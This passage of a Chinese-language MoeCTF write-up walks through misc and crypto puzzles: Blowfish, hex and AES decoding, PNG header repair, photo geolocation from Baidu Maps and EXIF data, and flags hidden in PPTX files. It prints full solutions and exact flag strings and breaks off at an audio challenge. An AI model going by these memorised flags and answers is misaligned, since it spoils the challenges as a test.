&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key: the tailing 8 bytes of hash of &amp;quot;zundujiadu?&amp;quot; which begin with b6091904cdfb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv: the end 8 bytes of hash of &amp;quot;dududu?&amp;quot; which begin with 272bf1da2207
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hint1: how do Bitcoin addresses encode?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hint2: the name of cryptosystem is &amp;quot;bl****sh&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过提示可以得知需要看看比特币地址生成算法以及寻找 &lt;code&gt;bl&lt;&#x2F;code&gt; 开头并且以 &lt;code&gt;sh&lt;&#x2F;code&gt; 结尾的加密算法，根据寻找可以确定是 &lt;code&gt;Blowfish&lt;&#x2F;code&gt; 算法。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;比特币地址生成算法详解 - https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhaoweiwei&#x2F;p&#x2F;address.html&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;通过比特币地址生成算法可以看到使用了 &lt;code&gt;sha-256&lt;&#x2F;code&gt; 和 &lt;code&gt;base58&lt;&#x2F;code&gt; ，将 &lt;code&gt;zundujiadu?&lt;&#x2F;code&gt; 和 &lt;code&gt;dududu?&lt;&#x2F;code&gt; 进行 sha-256 加密可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sha256（zundujiadu?）= b6091904cdfb8c10acdbbf56ae402c6b4a5f69087778342d57e55c126f1557b3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sha256（dududu?）= 272bf1da2207f27417ba44c1c67fc7559ce543a8948b854767e9fca0871f9834
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;从而可以得出 key 和 iv 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;key: 57e55c126f1557b3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;iv: 67e9fca0871f9834
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将密文进行 base58 解码后再丢进 Blowfish 解密，填进 cipher，key 和 iv ，解密后可以得到一串 base64 编码内容，解码后即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{wow_you_aRe_the_masteR_of_Zundujiadu_92WPIBung92WPIBung9?WPIBung}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;da-bu-kai-de-tu-pian-1&quot;&gt;打不开的图片1&lt;a class=&quot;zola-anchor&quot; href=&quot;#da-bu-kai-de-tu-pian-1&quot; aria-label=&quot;Anchor link for: da-bu-kai-de-tu-pian-1&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 010 打开搜索 flag ，可以找到 16进制内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;36 64 36 66 36 35 36 33 37 34 36 36 37 62 35 38 34 34 35 35 35 66 36 39 33 35 35 66 37 36 33 33 37 32 37 39 35 66 33 36 36 35 34 30 37 35 33 32 36 39 36 36 37 35 33 31 37 64 36 64 36 66 36 35 36 33 37 34 36 36 37 62 35 38 34 34 35 35 35 66 36 39 33 35 35 66 37 36 33 33 37 32 37 39 35 66 33 36 36 35 34 30 37 35 33 32 36 39 36 36 37 35 33 31 37 64
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;经过两次 Hex 就可以得到 flag &lt;code&gt;moectf{XDU_i5_v3ry_6e@u2ifu1}&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;da-bu-kai-de-tu-pian-2&quot;&gt;打不开的图片2&lt;a class=&quot;zola-anchor&quot; href=&quot;#da-bu-kai-de-tu-pian-2&quot; aria-label=&quot;Anchor link for: da-bu-kai-de-tu-pian-2&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;修改文件头 &lt;code&gt;89 50 4E 47&lt;&#x2F;code&gt; ，并修改图片后缀为 &lt;code&gt;.png&lt;&#x2F;code&gt; 就可以得到 flag &lt;code&gt;moectf{D0_yOu_1ik3_Bo7@ck_?}&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FwYTbNQNLE5BKF94xRE5l%252F%25E6%2589%2593%25E4%25B8%258D%25E5%25BC%2580%25E7%259A%2584%25E5%259B%25BE%25E7%2589%25872-1.png%3Falt%3Dmedia%26token%3D32d662d2-709b-46b9-a94b-84822fa9514d&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=8599592608a36e5cc88b4c6c02399d8eb9b5bec3c7a6c0aef8e0d42c60a6a6be&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ji-wei-cha-xun&quot;&gt;机位查询&lt;a class=&quot;zola-anchor&quot; href=&quot;#ji-wei-cha-xun&quot; aria-label=&quot;Anchor link for: ji-wei-cha-xun&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;0x00&quot;&gt;0x00&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x00&quot; aria-label=&quot;Anchor link for: 0x00&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;第一张图的信息有 &lt;code&gt;南宁站、城市便捷酒店连锁、高铁商务酒店、猪霸王&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;通过分析以及通过百度全景可以得知附近只有 &lt;code&gt;嘉士摩根国际&lt;&#x2F;code&gt; 一个高楼，故确认为 &lt;code&gt;jiashi&lt;&#x2F;code&gt; 。&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;map.baidu.com&#x2F;search&#x2F;%E7%8C%AA%E9%9C%B8%E7%8E%8B%E7%85%AE%E7%B2%89(%E7%81%AB%E8%BD%A6%E7%AB%99%E5%BA%97)&#x2F;@12058751.709101077,2594955.89747966,19.5z?querytype=s&amp;amp;da_src=shareurl&amp;amp;wd=%E7%8C%AA%E9%9C%B8%E7%8E%8B%E7%85%AE%E7%B2%89(%E7%81%AB%E8%BD%A6%E7%AB%99%E5%BA%97)&amp;amp;c=1&amp;amp;src=0&amp;amp;pn=0&amp;amp;sug=0&amp;amp;l=5&amp;amp;b=(4598185.960012987,705108.7499770466;18581929.960012987,8274516.749977047)&amp;amp;from=webmap&amp;amp;biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&amp;amp;device_ratio=2&quot;&gt;百度地图&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FoUZqUiIrPhyE1Jqa8h9W%252F%25E6%259C%25BA%25E4%25BD%258D%25E6%259F%25A5%25E8%25AF%25A2-1.png%3Falt%3Dmedia%26token%3D33af42d1-816c-44e4-8b59-a74edf634a5b&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=b98a4a92eca87f284f4069eef3c5ed2865cdbf43847953bd3e9f3cb11b1173f4&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x01&quot;&gt;0x01&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x01&quot; aria-label=&quot;Anchor link for: 0x01&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;第二张图通过图片可以获得的信息 &lt;code&gt;中山路美食街&lt;&#x2F;code&gt; ，并且该美食街位于图片正中间，说明沿着一条直线拍摄的，根据百度全景可以得知美食街对面的高楼就是 &lt;code&gt;百盛步行街广场&lt;&#x2F;code&gt; ，故得到第二部分 &lt;code&gt;baisheng&lt;&#x2F;code&gt; 。&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;map.baidu.com&#x2F;search&#x2F;%E7%99%BE%E7%9B%9B%E6%AD%A5%E8%A1%8C%E8%A1%97%E5%B9%BF%E5%9C%BA&#x2F;@12059195.479963213,2593501.560549225,18.36z?querytype=s&amp;amp;da_src=shareurl&amp;amp;wd=%E7%99%BE%E7%9B%9B%E6%AD%A5%E8%A1%8C%E8%A1%97%E5%B9%BF%E5%9C%BA&amp;amp;c=261&amp;amp;src=0&amp;amp;wd2=%E5%8D%97%E5%AE%81%E5%B8%82%E5%85%B4%E5%AE%81%E5%8C%BA&amp;amp;pn=0&amp;amp;sug=1&amp;amp;l=19&amp;amp;b=(12058913.782931838,2593214.5165782175;12059421.277068164,2593489.2234217827)&amp;amp;from=webmap&amp;amp;biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&amp;amp;sug_forward=d05995cc8d0be96ab020a82e&amp;amp;device_ratio=2&quot;&gt;百度地图&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F2NqJ7cAQ15cwL2B1H028%252F%25E6%259C%25BA%25E4%25BD%258D%25E6%259F%25A5%25E8%25AF%25A2-2.png%3Falt%3Dmedia%26token%3Dfe9f89fd-2108-40d6-8eb6-47de9dd6f07d&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=98f79a4be8ba334a1708c367084b7597c18bc70b1754d6d1f201ffd81d2a24e3&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h4 id=&quot;0x02&quot;&gt;0x02&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x02&quot; aria-label=&quot;Anchor link for: 0x02&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;通过第三张图可以得到以下信息&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;建筑物：时代丽都、中国人保、中国民生银行（很远）、广发银行（很远）、广西农信（很远）
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;GPS：108.35911345055136,22.81343269333407 High 156.08
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因为存在远近的建筑物，根据这些建筑物画一条直线可以判断大体区域，再根据卫星图判断位置（以不会遮挡图片建筑物为准）。通过尝试 &lt;code&gt;宁汇大厦、东方明珠花园和汇金苑&lt;&#x2F;code&gt; ，最后在 &lt;code&gt;汇金苑&lt;&#x2F;code&gt; 确认了答案（flag 提交成功），得出第三部分 &lt;code&gt;huijin&lt;&#x2F;code&gt; 。&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;map.baidu.com&#x2F;search&#x2F;%E6%97%B6%E4%BB%A3%E4%B8%BD%E9%83%BD&#x2F;@12064254.043157246,2593252.355246558,18.15z&#x2F;maptype%3DB_EARTH_MAP?querytype=s&amp;amp;da_src=shareurl&amp;amp;wd=%E6%97%B6%E4%BB%A3%E4%B8%BD%E9%83%BD&amp;amp;c=261&amp;amp;src=0&amp;amp;pn=0&amp;amp;sug=0&amp;amp;l=17&amp;amp;b=(12062963.947684012,2592744.1179828583;12064682.414505962,2593668.946917101)&amp;amp;from=webmap&amp;amp;biz_forward=%7B%22scaler%22:2,%22styles%22:%22sl%22%7D&amp;amp;device_ratio=2&quot;&gt;百度地图&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252Fnxr4HcSrXLYfbTCdHiAy%252F%25E6%259C%25BA%25E4%25BD%258D%25E6%259F%25A5%25E8%25AF%25A2-3.png%3Falt%3Dmedia%26token%3Dabb42491-ada1-4fc3-a102-6f4c2c21d596&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=c3d933937cfb0bd8513631127523704f7d0bf5c48583358c9c487a31157ab142&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;qi-guai-de-ya-suo-bao&quot;&gt;奇怪的压缩包&lt;a class=&quot;zola-anchor&quot; href=&quot;#qi-guai-de-ya-suo-bao&quot; aria-label=&quot;Anchor link for: qi-guai-de-ya-suo-bao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;├─docProps
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;├─ppt
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─comments
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─media
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─slideLayouts
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  │  └─_rels
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─slideMasters
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  │  └─_rels
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─slides
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  │  └─_rels
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─tags
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  ├─theme
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;│  └─_rels
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;└─_rels
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;压缩包包含以上内容，根据百度搜索得知是 &lt;code&gt;.pptx&lt;&#x2F;code&gt; 格式的，修改后缀即可打开这个 ppt ，但是目标并不是这个 ppt ，而是直接看压缩包里面的内容，通过翻看文件最终找到了 flag 。&lt;&#x2F;p&gt;
&lt;p&gt;第一段位于 &lt;code&gt;.&#x2F;ppt&#x2F;sildes&#x2F;slide2.xml&lt;&#x2F;code&gt; ，通过用 010 打开可以得知 &lt;code&gt;moectf{2ip&lt;&#x2F;code&gt; ；&lt;&#x2F;p&gt;
&lt;p&gt;第二段位于 &lt;code&gt;.&#x2F;ppt&#x2F;comments&#x2F;comment1.xml&lt;&#x2F;code&gt; ，通过打开 ppt 查看该评论所在的页面因此推断出他在第二段，即 &lt;code&gt;_?_&lt;&#x2F;code&gt; ；&lt;&#x2F;p&gt;
&lt;p&gt;第三段位于 &lt;code&gt;.&#x2F;ppt&#x2F;sildes&#x2F;slide4.xml&lt;&#x2F;code&gt; ，通过用 010 打开可以得知 &lt;code&gt;n0_i4&lt;&#x2F;code&gt; ；&lt;&#x2F;p&gt;
&lt;p&gt;第三段位于 &lt;code&gt;.&#x2F;ppt&#x2F;sildes&#x2F;slide5.xml&lt;&#x2F;code&gt; ，通过用 010 打开可以得知 &lt;code&gt;_pp4x!}&lt;&#x2F;code&gt; ；&lt;&#x2F;p&gt;
&lt;p&gt;因此 flag 就是 &lt;code&gt;moectf{2ip_?_n0_i4_pp4x!}&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;building-near-lake&quot;&gt;building_near_lake&lt;a class=&quot;zola-anchor&quot; href=&quot;#building-near-lake&quot; aria-label=&quot;Anchor link for: building-near-lake&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;根据搜图可以找到是 厦门大学(翔安校区)-德旺图书馆（118.31768,24.612841） &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;map.baidu.com&#x2F;dir&#x2F;&#x2F;@13171157.086975714,2810159.7013888475,19.71z,73t&quot;&gt;百度地图&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;根据右键查看属性可以得知手机型号是 Xiaomi 22122RK93C，也就是红米 K30，发布会日期是 20221227，提交后就可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;basele-dui&quot;&gt;base乐队&lt;a class=&quot;zola-anchor&quot; href=&quot;#basele-dui&quot; aria-label=&quot;Anchor link for: basele-dui&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F4XVQ1ieBGYOSY4d5k2MV%252Fbase%25E4%25B9%2590%25E9%2598%259F-1.png%3Falt%3Dmedia%26token%3Db504b650-da94-4d35-a636-c2ddc292f33c&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=c1f31e509a11dfe7722adef1fce3d954415f6add16dbbe74d826f571aba08cfa&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;tang-tang-tang&quot;&gt;烫烫烫&lt;a class=&quot;zola-anchor&quot; href=&quot;#tang-tang-tang&quot; aria-label=&quot;Anchor link for: tang-tang-tang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import chardet
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;data = &amp;quot;+j9k-+Zi8-+T2A-+doQ-flag+&#x2F;xo-+AAo-+AAo-a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262+AAo-+AAo-+T0Y-+Zi8-flag+dSg-AES+UqA-+W8Y-+ToY-+&#x2F;ww-key+Zi8-+Tgs-+l2I-+j9k-+iEw-+W1c-+doQ-sha256+&#x2F;wg-hash+UDw-+doQ-+XwA-+WTQ-+Zi8-b34edc782d68fda34dc23329+&#x2F;wk-+AAo-+AAo-+YkA-+TuU-+i&#x2F;Q-+&#x2F;ww-codepage+dx8-+doQ-+X4g-+kc0-+iYE-+VUo-+&#x2F;wg-+AAo-&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 使用chardet猜测可能的编码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;guess_encoding = chardet.detect(data.encode())[&amp;#39;encoding&amp;#39;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(f&amp;quot;Guessed Encoding: {guess_encoding}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 尝试多种字符集进行解码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;charsets = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;ascii&amp;quot;, &amp;quot;utf-8&amp;quot;, &amp;quot;utf-7&amp;quot;,&amp;quot;latin1&amp;quot;, &amp;quot;big5&amp;quot;, &amp;quot;gb2312&amp;quot;, &amp;quot;gbk&amp;quot;, &amp;quot;hz&amp;quot;, &amp;quot;iso2022_jp&amp;quot;, &amp;quot;iso2022_jp_1&amp;quot;, &amp;quot;iso2022_jp_2&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;iso2022_jp_2004&amp;quot;, &amp;quot;iso2022_jp_3&amp;quot;, &amp;quot;iso2022_jp_ext&amp;quot;, &amp;quot;iso2022_kr&amp;quot;, &amp;quot;cp1250&amp;quot;, &amp;quot;cp1251&amp;quot;, &amp;quot;cp1252&amp;quot;, &amp;quot;cp1253&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;cp1254&amp;quot;, &amp;quot;cp1255&amp;quot;, &amp;quot;cp1256&amp;quot;, &amp;quot;cp1257&amp;quot;, &amp;quot;cp1258&amp;quot;, &amp;quot;cp874&amp;quot;, &amp;quot;cp932&amp;quot;, &amp;quot;cp949&amp;quot;, &amp;quot;cp950&amp;quot;, &amp;quot;euc_jp&amp;quot;, &amp;quot;euc_jis_2004&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;euc_jisx0213&amp;quot;, &amp;quot;euc_kr&amp;quot;, &amp;quot;koi8_r&amp;quot;, &amp;quot;koi8_u&amp;quot;, &amp;quot;mac_cyrillic&amp;quot;, &amp;quot;mac_greek&amp;quot;, &amp;quot;mac_iceland&amp;quot;, &amp;quot;mac_latin2&amp;quot;, &amp;quot;mac_roman&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mac_turkish&amp;quot;, &amp;quot;ptcp154&amp;quot;, &amp;quot;shift_jis&amp;quot;, &amp;quot;shift_jis_2004&amp;quot;, &amp;quot;shift_jisx0213&amp;quot;, &amp;quot;utf_32&amp;quot;, &amp;quot;utf_32_be&amp;quot;, &amp;quot;utf_32_le&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for charset in charsets:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        decoded_data = data.encode(&amp;#39;latin1&amp;#39;).decode(charset)  # 首先将数据编码为latin1，然后尝试使用不同的字符集解码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(f&amp;quot;Decoded with {charset}: {decoded_data}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    except Exception as e:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(f&amp;quot;Failed to decode with {charset} due to {e}&amp;quot;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;这是你的flag：
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;所以说，codepage真的很重要啊（
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将 &lt;code&gt;所以说，codepage真的很重要啊（&lt;&#x2F;code&gt; 进行 SHA-256 加密可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将 flag 进行 AES-ECB 解密即可得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{codep@ge_pl@ys_@n_iMport@nt_role_in_intern@tion@liz@tion_g92WPIB}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ni-xiang-yao-flagma&quot;&gt;你想要flag吗&lt;a class=&quot;zola-anchor&quot; href=&quot;#ni-xiang-yao-flagma&quot; aria-label=&quot;Anchor link for: ni-xiang-yao-flagma&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;使用 Audacity 可以看到以下内容。&lt;&#x2F;p&gt;
